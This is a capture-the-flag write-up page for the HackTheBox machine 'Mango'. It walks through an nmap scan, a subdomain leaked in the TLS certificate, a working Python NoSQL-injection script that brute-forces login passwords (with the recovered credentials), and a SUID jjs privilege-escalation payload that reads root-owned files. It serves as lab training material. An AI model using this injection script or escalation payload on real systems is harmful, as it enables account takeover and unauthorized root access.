<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Mango | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Mango HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/mango/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/mango/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Mango "><meta property="og:description" content="Mango HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/mango/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/mango/mango.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-04-18T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/mango/mango.png"><meta name=twitter:title content="Mango "><meta name=twitter:description content="Mango HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Mango ","item":"https://s4ch.github.io/writeups/hackthebox/mango/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Mango ","name":"Mango ","description":"Mango HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"≡ƒÆó Info Name: Mango Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Network enumeration: 22, 80, 443 Webapp discovery: SSL cert leaks subdomain in CN Webapp exploitation: mango -\u003e mongDB -\u003e noSQLi System enumeration: jjs history **System Privilege Escalation of Machine **: jjs SUID Network enumeration TL;DR: 22, 80, 443\nThis time I launched a full scan with nmap: nmap -A -oA nmap_full 10.10.10.162:\n# Nmap 7.80 scan initiated Thu Mar 26 23:50:11 2020 as: nmap -A -oA nmap_full 10.10.10.162 Nmap scan report for 10.10.10.162 Host is up (0.031s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Mango | Search Base | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=31997%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31B OS:F%P=x86_64-unknown-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54 OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120 OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4 OS:0%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 33.10 ms 10.10.14.1 2 33.13 ms 10.10.10.162 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Mar 26 23:50:39 2020 -- 1 IP address (1 host up) scanned in 28.40 seconds As for many boxes, we have only a web application and a SSH server.\nWebapp discovery TL;DR: SSL cert leaks subdomain in CN\nWhen we try to reach the port 80 (http://10.10.10.162) we are denied.\nOn port 443 (https://10.10.10.162) there is a search engine, but after a few minutes enumerating and fuzzing manually I concluded this was a rabbit hole.\nIf you look carefully at the nmap results, one of the scripts discloses us a subdomain.\n| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN It is also possible to find it with openssl:\n$ openssl s_client -connect 10.10.10.162:443 ... issuer=C = IN, ST = None, L = None, O = Mango Prv Ltd., OU = None, CN = staging-order.mango.htb, emailAddress = admin@mango.htb So I set the IP matching staging-order.mango.htb in /etc/hosts:\n10.10.10.162 staging-order.mango.htb And when returning on port 80 (http://staging-order.mango.htb/) we are no longer denied.\nThis is a login page with a form:\nWebapp exploitation TL;DR: mango -\u003e mongDB -\u003e noSQLi\nHere a small guessing step is required.\nThe name of the box is mango, a popular NoSQL database is MongoDB, so it is suggesting that we have to exploit a NoSQLi, definitely on the auth form.\nFor people who never exploited a NoSQLi vulnerability before, you can find some payload on PayloadsAllTheThings. I contributed several time to the NoSQLi page so I know the payload that are here.\nI adapted one script to bruteforce the password of a given account.\nimport requests import urllib3 import string import urllib urllib3.disable_warnings() username=\"mango\" password=\"\" u=\"http://staging-order.mango.htb/\" headers={'content-type': 'application/x-www-form-urlencoded'} while True: for c in string.printable: if c not in ['*','+','.','?','|','\u0026','$']: payload='username=%s\u0026password[$regex]=^%s\u0026login=login' % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if 'Log in for ordering Sweet \u0026 Juicy Mango.' not in r.text or r.status_code == 302: print(\"Found one more char : %s\" % (password+c)) password += c Let’s run it for admin user:\n$ python bf.py Found one more char : t Found one more char : t9 Found one more char : t9K Found one more char : t9Kc Found one more char : t9KcS Found one more char : t9KcS3 Found one more char : t9KcS3\u003e Found one more char : t9KcS3\u003e! Found one more char : t9KcS3\u003e!0 Found one more char : t9KcS3\u003e!0B Found one more char : t9KcS3\u003e!0B# Found one more char : t9KcS3\u003e!0B#2 We can also run it for mango.\nFinally we have 2 accounts:\nadmin / t9KcS3\u003e!0B#2 mango / h3mXK8RhU~f{]f5H There is even a guy that made a small script / tool around this so you don’t have to change your script each time.\nIf you try to login with a accounts you will get this message:\n\u003ch1\u003eUnder Plantation\u003c/h1\u003e \u003ch2\u003eSorry for the inconvenience. We just started farming!\u003c/h2\u003e \u003ch3\u003eTo contact us in the meantime please email: admin@mango.htb\u003cbr /\u003e We rarely look at our inboxes.\u003c/h3\u003e System enumeration TL;DR: jjs history\nIt seems there is not more stuff to do on teh webapp.\nBut we can use the credentials to connect via ssh.\n$ ssh mango@10.10.10.162 mango@mango:~$ ls -lhA /home/admin/ total 40K lrwxrwxrwx 1 admin admin 9 Sep 27 14:30 .bash_history -\u003e /dev/null -rw-r--r-- 1 admin admin 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 admin admin 3.7K Apr 4 2018 .bashrc -rw-rw-r-- 1 root admin 481 Mar 27 16:53 .jjs.history -rw-rw-r-- 1 admin admin 227 Mar 27 16:53 js drwxrwxr-x 3 admin admin 4.0K Mar 27 16:27 .local -rw-r--r-- 1 admin admin 807 Apr 4 2018 .profile -rw-rw-r-- 1 admin admin 8.5K Mar 27 16:31 test.py -r-------- 1 admin admin 33 Sep 27 14:29 user.txt mango@mango:~$ su admin Password: $ id uid=4000000000(admin) gid=1001(admin) groups=1001(admin) $ cd $ cat user.txt 79bf31c6c6eb38a8567832f7f8b47e92 We found the user flag we also saw there is a .jjs.history file.\nSystem Privilege Escalation of Machine TL;DR: jjs SUID\nSo let’s find where is the jjs binary on the file system.\nadmin@mango:/home/admin$ ls -lh $(which jjs) lrwxrwxrwx 1 root root 21 Sep 27 14:15 /usr/bin/jjs -\u003e /etc/alternatives/jjs admin@mango:/home/admin$ ls -lh /etc/alternatives/jjs lrwxrwxrwx 1 root root 42 Sep 27 14:15 /etc/alternatives/jjs -\u003e /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs admin@mango:/home/admin$ ls -lh /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs -rwsr-sr-- 1 root admin 11K Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs We can see there is a SUID bit on the binary.\nAs each time we want to do an pe on Linux, let’s check GTFOBins first. There is a page for jjs.\nSo using the SUID pe payload we found on GTFOBins, we can elevate our privileges to root, and use this to read the root flag.\n$ echo \"Java.type('java.lang.Runtime').getRuntime().exec('cp /root/root.txt /tmp/.cyfun/cyfun.txt').waitFor()\" | jjs $ echo \"Java.type('java.lang.Runtime').getRuntime().exec('chmod g+rw /tmp/.cyfun/cyfun.txt').waitFor()\" | jjs $ cat /tmp/.cyfun/cyfun.txt 8a8ef79a7a2fbb01ea81688424e9ab15 ","wordCount":"1027","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/mango/mango.png","datePublished":"2020-04-18T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/mango/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Mango</h1><div class=post-description>Mango HackTheBox writeup</div><div class=post-meta>&lt;span title='2020-04-18 00:00:00 +0000 UTC'>April 18, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;5 min&amp;nbsp;·&amp;nbsp;1027 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/linux/" class="post-tag" title="linux">linux&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/medium/" class="post-tag" title="medium">medium&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/mango/mango.png alt="Mango HackTheBox Machine"><p>Mango - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#webapp-discovery>Webapp discovery</a></li><li><a href=#webapp-exploitation>Webapp exploitation</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#system-privilege-escalation-of-machine>System Privilege Escalation of Machine</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Mango</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/214>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network enumeration</strong>: 22, 80, 443</li><li><strong>Webapp discovery</strong>: SSL cert leaks subdomain in CN</li><li><strong>Webapp exploitation</strong>: mango -> mongDB -> noSQLi</li><li><strong>System enumeration</strong>: jjs history</li><li>**System Privilege Escalation of Machine **: jjs SUID</li></ul><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p><strong>TL;DR</strong>: 22, 80, 443</p><p>This time I launched a full scan with <a href=https://nmap.org/>nmap</a>: <code>nmap -A -oA nmap_full 10.10.10.162</code>:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Thu Mar 26 23:50:11 2020 as: nmap -A -oA nmap_full 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.031s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=31997%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31B
OS:F%P=x86_64-unknown-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   33.10 ms 10.10.14.1
2   33.13 ms 10.10.10.162

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 26 23:50:39 2020 -- 1 IP address (1 host up) scanned in 28.40 seconds
</code></pre><p>As for many boxes, we have only a web application and a SSH server.</p><h3 id=webapp-discovery>Webapp discovery<a hidden class=anchor aria-hidden=true href=#webapp-discovery>#</a></h3><p><strong>TL;DR</strong>: SSL cert leaks subdomain in CN</p><p>When we try to reach the port 80 (http://10.10.10.162) we are denied.</p><p>On port 443 (https://10.10.10.162) there is a search engine, but after a few
minutes enumerating and fuzzing manually I concluded this was a rabbit hole.</p><p>If you look carefully at the <a href=https://nmap.org/>nmap</a> results, one of the scripts discloses us a
subdomain.</p><pre tabindex=0><code>| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
</code></pre><p>It is also possible to find it with <code>openssl</code>:</p><pre tabindex=0><code>$ openssl s_client -connect 10.10.10.162:443
...
issuer=C = IN, ST = None, L = None, O = Mango Prv Ltd., OU = None, CN = staging-order.mango.htb, emailAddress = admin@mango.htb
</code></pre><p>So I set the IP matching <code>staging-order.mango.htb</code> in <code>/etc/hosts</code>:</p><pre tabindex=0><code>10.10.10.162 staging-order.mango.htb
</code></pre><p>And when returning on port 80 (<a href=http://staging-order.mango.htb/>http://staging-order.mango.htb/</a>) we are no longer
denied.</p><p>This is a login page with a form:</p><p><img loading=lazy src=https://i.imgur.com/syrLOxL.jpg alt></p><h3 id=webapp-exploitation>Webapp exploitation<a hidden class=anchor aria-hidden=true href=#webapp-exploitation>#</a></h3><p><strong>TL;DR</strong>: mango -> mongDB -> noSQLi</p><p>Here a small guessing step is required.</p><p>The name of the box is <em>mango</em>, a popular NoSQL database is MongoDB, so it is
suggesting that we have to exploit a NoSQLi, definitely on the auth form.</p><p>For people who never exploited a NoSQLi vulnerability before, you can find
some payload on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>PayloadsAllTheThings</a>. I contributed several time
to the <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/commits/master/NoSQL%20Injection>NoSQLi page</a> so I know the payload that are here.</p><p>I adapted one script to bruteforce the password of a given account.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib3
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib
</span></span><span style=display:flex><span>urllib3<span style=color:#f92672>.</span>disable_warnings()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mango&#34;</span>
</span></span><span style=display:flex><span>password<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>u<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://staging-order.mango.htb/&#34;</span>
</span></span><span style=display:flex><span>headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;content-type&#39;</span>: <span style=color:#e6db74>&#39;application/x-www-form-urlencoded&#39;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string<span style=color:#f92672>.</span>printable:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> c <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;*&#39;</span>,<span style=color:#e6db74>&#39;+&#39;</span>,<span style=color:#e6db74>&#39;.&#39;</span>,<span style=color:#e6db74>&#39;?&#39;</span>,<span style=color:#e6db74>&#39;|&#39;</span>,<span style=color:#e6db74>&#39;&amp;&#39;</span>,<span style=color:#e6db74>&#39;$&#39;</span>]:
</span></span><span style=display:flex><span>            payload<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;username=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&amp;password[$regex]=^</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&amp;login=login&#39;</span> <span style=color:#f92672>%</span> (username, password <span style=color:#f92672>+</span> c)
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(u, data <span style=color:#f92672>=</span> payload, headers <span style=color:#f92672>=</span> headers, verify <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>, allow_redirects <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Log in for ordering Sweet &amp; Juicy Mango.&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text <span style=color:#f92672>or</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>302</span>:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;Found one more char : </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (password<span style=color:#f92672>+</span>c))
</span></span><span style=display:flex><span>                password <span style=color:#f92672>+=</span> c
</span></span></code></pre></div><p>Let&rsquo;s run it for <code>admin</code> user:</p><pre tabindex=0><code>$ python bf.py
Found one more char : t
Found one more char : t9
Found one more char : t9K
Found one more char : t9Kc
Found one more char : t9KcS
Found one more char : t9KcS3
Found one more char : t9KcS3&gt;
Found one more char : t9KcS3&gt;!
Found one more char : t9KcS3&gt;!0
Found one more char : t9KcS3&gt;!0B
Found one more char : t9KcS3&gt;!0B#
Found one more char : t9KcS3&gt;!0B#2
</code></pre><p>We can also run it for <code>mango</code>.</p><p>Finally we have 2 accounts:</p><ul><li><code>admin</code> / <code>t9KcS3>!0B#2</code></li><li><code>mango</code> / <code>h3mXK8RhU~f{]f5H</code></li></ul><p>There is even a guy that made a small
<a href=https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration>script / tool</a>
around this so you don&rsquo;t have to change your script each time.</p><p>If you try to login with a accounts you will get this message:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>h1</span>&gt;Under Plantation&lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>h2</span>&gt;Sorry for the inconvenience. We just started farming!&lt;/<span style=color:#f92672>h2</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>h3</span>&gt;To contact us in the meantime please email: admin@mango.htb&lt;<span style=color:#f92672>br</span> /&gt;
</span></span><span style=display:flex><span>We rarely look at our inboxes.&lt;/<span style=color:#f92672>h3</span>&gt;
</span></span></code></pre></div><h3 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h3><p><strong>TL;DR</strong>: jjs history</p><p>It seems there is not more stuff to do on teh webapp.</p><p>But we can use the credentials to connect via ssh.</p><pre tabindex=0><code>$ ssh mango@10.10.10.162

mango@mango:~$ ls -lhA /home/admin/
total 40K
lrwxrwxrwx 1 admin admin    9 Sep 27 14:30 .bash_history -&gt; /dev/null
-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 admin admin 3.7K Apr  4  2018 .bashrc
-rw-rw-r-- 1 root  admin  481 Mar 27 16:53 .jjs.history
-rw-rw-r-- 1 admin admin  227 Mar 27 16:53 js
drwxrwxr-x 3 admin admin 4.0K Mar 27 16:27 .local
-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
-rw-rw-r-- 1 admin admin 8.5K Mar 27 16:31 test.py
-r-------- 1 admin admin   33 Sep 27 14:29 user.txt

mango@mango:~$ su admin
Password:
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
$ cd
$ cat user.txt
79bf31c6c6eb38a8567832f7f8b47e92
</code></pre><p>We found the user flag we also saw there is a <code>.jjs.history</code> file.</p><h3 id=system-privilege-escalation-of-machine>System Privilege Escalation of Machine<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation-of-machine>#</a></h3><p><strong>TL;DR</strong>: jjs SUID</p><p>So let&rsquo;s find where is the <code>jjs</code> binary on the file system.</p><pre tabindex=0><code>admin@mango:/home/admin$ ls -lh $(which jjs)
lrwxrwxrwx 1 root root 21 Sep 27 14:15 /usr/bin/jjs -&gt; /etc/alternatives/jjs
admin@mango:/home/admin$ ls -lh /etc/alternatives/jjs
lrwxrwxrwx 1 root root 42 Sep 27 14:15 /etc/alternatives/jjs -&gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
admin@mango:/home/admin$ ls -lh /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-rwsr-sr-- 1 root admin 11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
</code></pre><p>We can see there is a SUID bit on the binary.</p><p>As each time we want to do an pe on Linux, let&rsquo;s check <a href=https://gtfobins.github.io/>GTFOBins</a>
first. There is a page for <a href=https://gtfobins.github.io/gtfobins/jjs/#suid>jjs</a>.</p><p>So using the SUID pe payload we found on <a href=https://gtfobins.github.io/>GTFOBins</a>, we can elevate
our privileges to root, and use this to read the root flag.</p><pre tabindex=0><code>$ echo &#34;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;cp /root/root.txt /tmp/.cyfun/cyfun.txt&#39;).waitFor()&#34; | jjs
